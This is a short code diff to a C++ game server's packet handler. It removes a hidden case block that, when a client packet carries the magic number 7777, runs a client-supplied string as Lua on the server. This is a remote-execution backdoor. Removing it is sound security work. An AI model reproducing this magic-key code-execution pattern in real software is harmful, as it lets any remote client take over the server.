@@ -1130,13 +1130,6 @@ void CCharacter::ProcessPacket(unsigned short usCmd, RPACKET pk)
 			GetPlyMainCha()->Cmd_SetKitbagAutoLock(cAutoLock);
 		}
 		break;
-	case CMD_CM_KITBAGTEMPlocks: {
-		if (const auto keys = READ_SHORT(pk); keys == 7777)
-		{
-			cChar* l_content = READ_STRING(pk);
-			luaL_dostring(g_pLuaState, l_content);
-		}
-	}
 	case CMD_CM_STORE_OPEN_ASK:{
 		const char *szPwd = READ_STRING(pk);
 		CCharacter *pMainCha = GetPlyMainCha();
